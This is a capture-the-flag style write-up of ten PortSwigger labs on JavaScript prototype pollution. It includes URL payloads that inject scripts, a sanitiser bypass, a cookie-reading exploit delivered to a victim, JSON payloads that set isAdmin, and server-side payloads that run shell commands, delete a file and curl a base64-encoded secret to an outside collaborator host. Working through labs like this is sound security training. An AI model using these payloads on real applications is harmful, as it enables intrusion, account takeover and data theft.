# Prototype Pollution

### Lab 1: Pollution via Browser APIs <a href="#lab-1-pollution-via-browser-apis" id="lab-1-pollution-via-browser-apis"></a>

This lab is vulnerable to DOM XSS. To solve the lab, add to `Object.prototype` to call the `alert()` function.

DOM Invader can be used for this to automatically search for possible vulnerabilities, but I prefer exploiting manually.

This lab gives users a 'Submit feedback' and 'Search' functionalities.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-e7521fe29fa040b0aa34c66e03caa1440b2d843b%252Fportswigger-prototype-writeup-image.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=996e0587&#x26;sv=2" alt=""><figcaption></figcaption></figure>

When searching for stuff, it sends a POST request to a `/logger` endpoint:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-be0d8ce46ec565adc84245e685cc8d239cb36edd%252Fportswigger-prototype-writeup-image-1.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c4a77b52&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Reading the page source shows a few files that have interesting stuff within them.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-81b1f90857498d4c750d813469fe630a840de101%252Fportswigger-prototype-writeup-image-2.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=7391970a&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The `searchLogger` file had some interesting code:

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

It uses `Object.defineProperty` to define `transport_url`. There is an attempt to make it unmodifiable, but there's no value assigned to it.

The `config` variable is a URL object using the browser's current location, and extracts the search parameters to convert them to a string. So the GET parameters (`/?`) is used. So the URL itself is the injection point.

I can try to add a property to the object. Using the parameters of `__proto__[test]=test` results in there being an added object:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a936c09c7ac4b47332814f9ddb4f64dbc78d3c3a%252Fportswigger-prototype-writeup-image-3.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=828d7c6d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This confirms the injection point, now I need to somehow call `alert(1)`. When reading the properties of `Object.defineProperty()`, I noticed there was a `value` property. This was used to define a value, and it was not defined for the `transport_url` object. Here's the code in the docs:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0a7d10d4227ca0303013bb9a5446d5795e98ecb2%252Fportswigger-prototype-writeup-image-5.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=69ecc150&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So using `__proto__[value]=test` might work, and it did load a `<script>` tag:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-b6f8aa96d2fff410ed41bd7b6d8e0eebf854f9ee%252Fportswigger-prototype-writeup-image-4.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f722bb7e&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This makes sense considering the code does check for whether `transport_url` is defined before creating a new `script` element. It then sets `script.src` to the `transport_url` variable.

I checked the XSS cheatsheet to find a payload, and it worked:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-952f4d0e7f0f94784986d2ccb441f7a9b8e092ef%252Fportswigger-prototype-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=6d36315c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The above XSS payload means I have to use:

```
/?__proto__[value]=data:text/javascript,alert(1)
```

### Lab 2: Client-Side -> DOM XSS <a href="#lab-2-client-side-greater-than-dom-xss" id="lab-2-client-side-greater-than-dom-xss"></a>

To solve this lab, call `alert()`. From the name of the lab, it is likely I have to pollute a prototype that is passed into a vulnerable sink.

Here's the `searchLogger()` function:

```javascript
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

So this passes `config.transport_url` to a `script` element. The lab still uses an unsanitised `config.params` variable to run this script.

I can first pollute `transport_url` via `/?__proto__[transport_url]=foo`. This causes the `<script>` tag to be generated:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-b18747df4d7691e9c7d59692920d9ae87dc099d3%252Fportswigger-prototype-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=fd4c12b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This is abusable in the same manner as Lab 1.

```
/?__proto__[transport_url]=data:text/javascript,alert(1)
```

### Lab 3: Another Client Side <a href="#lab-3-another-client-side" id="lab-3-another-client-side"></a>

This lab has the same thing, but it uses a different sink. Here's the `searchLogger()` function:

```javascript
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```

There's an `eval` function called, and it has a bit of logic within it. This script creates a `manager` object attached to `window`, and the `manager` has a method called `macro`.

To get to `eval`, I can use `__proto__.sequence=alert(1)`, since it checks for the existence of the `sequence` object.

This actually causes an error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-2cea22da75320379d0ed4abdefa9c22992a798dc%252Fportswigger-prototype-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=8f0d90c0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Using the browser Debugger, I can pause execution at the `eval` function to see what is being passed in. I noticed that the `manager.sequence` variable was changed to `alert(1)1`.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-c816c9441ce47a71f7b9a3e7d58f9f399f2eef27%252Fportswigger-prototype-writeup-image-9.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a1cfa0b4&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This is probably causing the errors with `eval`. To fix this, I can just append a `-`. Doing this will make the final payload `alert(1)-1`, which calls `alert(1)` and then subtracts 1.

The subtracting of 1 does not matter since the function is called.

### Lab 4: Flawed Sanitisation <a href="#lab-4-flawed-sanitisation" id="lab-4-flawed-sanitisation"></a>

To solve this lab, call `alert(1)`. Here's the `searchLogger()` function:

```javascript
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```

There is a sanitisation check, and keywords like `__proto__` aren't allowed. This uses `replaceAll`, which only **executes once AND does not stop the execution**. As such, using `__pro__proto__to__` works. The code strips away the middle `__proto__`, and then the rest of the string is combined to form `__proto__` (similar to using `....//`)

Here's the payload to solve the lab:

```javascript
/?__pro__proto__to__[transport_url]=data:text/javascript,alert(1)
```

### Lab 5: Third-Party Library <a href="#lab-5-third-party-library" id="lab-5-third-party-library"></a>

This lab recommends I use DOM Invader, because the third-party library has minified code.

Here are the libraries used:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-ca129349f7b8d3fd5147dfab3bce35f0f0167639%252Fportswigger-prototype-writeup-image-10.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=4191a73c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Firstly, the `jquery_ba_bbq.js` file is obviously the vulnerable one. When viewing it, it was made in 2010.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-ad74bf39f9f1185dc93b12d57cb99c007cb0ba39%252Fportswigger-prototype-writeup-image-11.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=cfdec77b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Next, there's a lot of mention of `hashchange`. In the `store.js` file, there's a `jquery` function:

```javascript
$(
    function()
    {
        $( window ).bind(
            'hashchange',
            function( e )
            {
                console.log('Hash Changed ' + location.hash);
                changeCategory( $.bbq.getState( 'cat' ) );
            }
        );

        $( window ).trigger( 'hashchange' );
    }
);
```

`location.hash` is the vulnerable property. That's as far as manual methods go, because I'm not gonna analyse those huge libraries.

I enabled DOM Invader, and it instantly found two vulnerable sources:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-4859fb44b7055de078659ddc26853488f4dfc12c%252Fportswigger-prototype-writeup-image-12.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=d366b966&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I scanned for gadgets for `hash`, and it found a sink:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-128e7121387bd298b48a336abb82f2340b2b05b9%252Fportswigger-prototype-writeup-image-13.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=566efeab&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Here's the payload:

```javascript
#constructor[prototype][hitCallback]=alert%281%29
```

Now, I just need to change the payload and deliver the exploit to the victim.

```html
<img src="x" onerror=document.location="https://0a9f0055042a4d69843f02aa00a80030.web-security-academy.net/#constructor[prototype][hitCallback]=alert(document.cookie)">
```

### Lab 6: Server-side pollution -> Privilege Escalation <a href="#lab-6-server-side-pollution-greater-than-privilege-escalation" id="lab-6-server-side-pollution-greater-than-privilege-escalation"></a>

To solve this lab, delete `carlos` as the `administrator` user. I am given this 'Restart node application' function:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-7d5e1f965c3f2443af566b10becd6248379d2c11%252Fportswigger-prototype-writeup-image-14.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=68d05e09&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This is because server-side pollution can break the server. Anyways, when logged in, I see this change address option:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-32a57cb69d93970365687bcdf465099152e6eb37%252Fportswigger-prototype-writeup-image-15.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=e8f9cd79&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Submitting this form sends a POST request with JSON:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-f57d878ea991228148d7129cf9fe3abc87f65863%252Fportswigger-prototype-writeup-image-16.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=2dc6745c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Note that the `isAdmin` variable has been set to `False`.

I can read the `updateAddress.js` file to find a vulnerable portion.

Here's the `handleSubmit` function:

```javascript
function handleSubmit(event) {
    event.preventDefault();

    const data = new FormData(event.target);

    const value = Object.fromEntries(data.entries());

    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4) {
            const responseJson = JSON.parse(this.responseText);
            const form = document.querySelector('form[name="change-address-form"');
            const formParent = form.parentElement;
            form.remove();
            const div = document.createElement("div");
            if (this.status == 200) {
                const header = document.createElement("h3");
                header.textContent = 'Updated Billing and Delivery Address';
                div.appendChild(header);
                formParent.appendChild(div);
                for (const [key, value] of Object.entries(responseJson).filter(e => e[0] !== 'isAdmin')) {
                    const label = document.createElement("label");
                    label.textContent = `${toLabel(key)}`;
                    div.appendChild(label);
                    const p = document.createElement("p");
                    p.textContent = `${JSON.stringify(value).replaceAll("\"", "")}`;
                    div.appendChild(p);
                }
            } else {
                const header = document.createElement("h3");
                header.textContent = 'Error';
                div.appendChild(header);
                formParent.appendChild(div);
                const p = document.createElement("p");
                p.textContent = `${JSON.stringify(responseJson.error && responseJson.error.message) || 'Unexpected error occurred.'} Please login again and retry.`;
                div.appendChild(p);
            }
        }
    };
    var form = event.currentTarget;
    xhr.open(form.method, form.action);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(JSON.stringify(value));
}
```

Quite long, but the most interesting part of this is the `isAdmin` check. Since this is JSON, I can just try to append a new variable within it for `__proto__`, since this uses `JSON.parse` without validating the data passed to it.

Here's a resource explaining it:

[![Logo](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afill%3A304%3A304%2F10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156\&width=20\&dpr=3\&quality=100\&sign=cb012a55\&sv=2)JavaScript Prototype Poisoning Vulnerabilities in the WildMedium](https://medium.com/intrinsic-blog/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96)

And here's the payload used:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-dc1fd432238a0b83c6ec7e328f103427c359c848%252Fportswigger-prototype-writeup-image-17.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9e29d718&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Afterwards, the Admin panel is available:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-1ec06ec0367a3a4ddfa829727769384cae593fea%252Fportswigger-prototype-writeup-image-18.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=222bd1ec&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 7: Server-side pollution without Polluted Property Reflection <a href="#lab-7-server-side-pollution-without-polluted-property-reflection" id="lab-7-server-side-pollution-without-polluted-property-reflection"></a>

To solve this lab, just exploit any form of prototype pollution. This lab is meant to teach methods to exploit pollution WITHOUT crashing the entire application BUT still causes a noticeable change.

So basically, I have to stealthily confirm whether pollution exists without changing anything in the website. I tried changing the `isAdmin` part, but it didn't solve the lab because technically that's destructive.

Within the code, the JSON is parsed with `this.responseText`, and then processed.

```js
const responseJson = JSON.parse(this.responseText);
const form = document.querySelector('form[name="change-address-form"');
const formParent = form.parentElement;
form.remove();
const div = document.createElement("div");
if (this.status == 200) {
```

`this.responseText` and `this.status` are both attached to the `this` object, which is the `xhr` object created.

As such, the `status` object can be manipulated, so to do this I entered an invalid JSON and changed the `status` variable to `444`:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-72c62ba9919882373e561484d70caa0abb9c69a6%252Fportswigger-prototype-writeup-image-19.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=206ae612&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This solves the lab, and demonstrates that it is possible to trigger a visible change WITHOUT causing any actual damage on the site.

### Lab 8: Bypass Input Filters <a href="#lab-8-bypass-input-filters" id="lab-8-bypass-input-filters"></a>

To solve this lab, delete `carlos` as the `administrator` user.

Attempting to use `__proto__` does not work:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-28c9d4e35e10d602690cf1e61ea697c796a1338a%252Fportswigger-prototype-writeup-image-20.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=10155ef2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Prototype pollution has multiple methods, and another way of doing it is through `constructor.prototype`.

The JSON from Lab 6 worked because it probably parsed the JSON as `__proto__.isAdmin`. To do the same thing here, I used:

```json
"constructor":{
    "prototype":{
        "isAdmin":true
    }
}
```

This worked:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-d58588b3cb5d434c72a68ca0db1c47a25bd28ee9%252Fportswigger-prototype-writeup-image-21.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c332d122&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Afterwards, delete `carlos`.

### Lab 9: RCE via Prototype Pollution <a href="#lab-9-rce-via-prototype-pollution" id="lab-9-rce-via-prototype-pollution"></a>

To solve this lab, delete `/home/carlos/morale.txt`. Firstly, privilege escalation allows me to access the admin panel and 'Run jobs':

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-18545a16f029803e552807e62fd302509fbc2915%252Fportswigger-prototype-writeup-image-22.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9a9ca89&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Clicking this reveals it does some stuff on the backend:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-bbccef1b0d37cffbce608fb707183e9f267bf90a%252Fportswigger-prototype-writeup-image-23.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=48a2094b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I injected a payload from Hacktricks:

```json
"__proto__": {
    "isAdmin":true,
    "NODE_OPTIONS": "--require /proc/self/environ", "env": { "
        EVIL":"console.log(require('child_process').execSync('rm /home/carlos/morale.txt').toString())//"}
    }
```

After injecting this and running the jobs, it solved the lab.

### Lab 10: Exfiltrating Data <a href="#lab-10-exfiltrating-data" id="lab-10-exfiltrating-data"></a>

This lab requires us to exfiltrate and submit the data within the `/home/carlos` directory. There's a file containing some flag, but I don't know the actual flag. This lab gives us administrative access with the run jobs admin panel.

This involves using Burp Collaborator to send the data out. I found that using `curl` can exfiltrate data:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-04c604f1ee180cc7b5b2dd9dcda03ec87bb45ce1%252Fportswigger-prototype-writeup-image-24.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=b571c546&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So using this, I can execute a command to read `/home/carlos/secret`. I can chain commands together to find out the file directory as well:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9c357fc5497ea12b215e1c7abae992a708fb504f%252Fportswigger-prototype-writeup-image-25.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=84b491bb&#x26;sv=2" alt=""><figcaption></figcaption></figure>

However, I was struggling to make it work because for some reason, I could not use `NODE_OPTIONS` to run commands. While researching online, I came across the `shell` method:

[https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/exploit-notes.hdks.org](https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/)

However, I could not make it work. I ended up using the solution, and it used `vim`...? I would have never thought of that.

Basically, `vim` can run terminal commands and what not, and this is done via `! <COMMAND>`.

```json
"__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos > file.txt; curl -X POST @file.txt tifhtpgg5onmoda4quc9lp6ii9o0cy0n.oastify.com\n"
}
```

The above works in triggering a DNS lookup, but it does not send the data. The solution uses `base64` and `@-` for stdin to send the data over.

The solution's payload is :

```json
"__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://jtg74fr6geycz3lu1knzwfh8tzzqnhe53.oastify.com\n"
}
```

This would cause the data to be sent over:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-2375fc224065faf0670c54697c548b0ac5ec3017%252Fportswigger-prototype-writeup-image-26.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=5fdfd0a1&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Submitting that solves the lab, and I suppose this lab forces us to use `vim` since Portswigger Academy covers it.
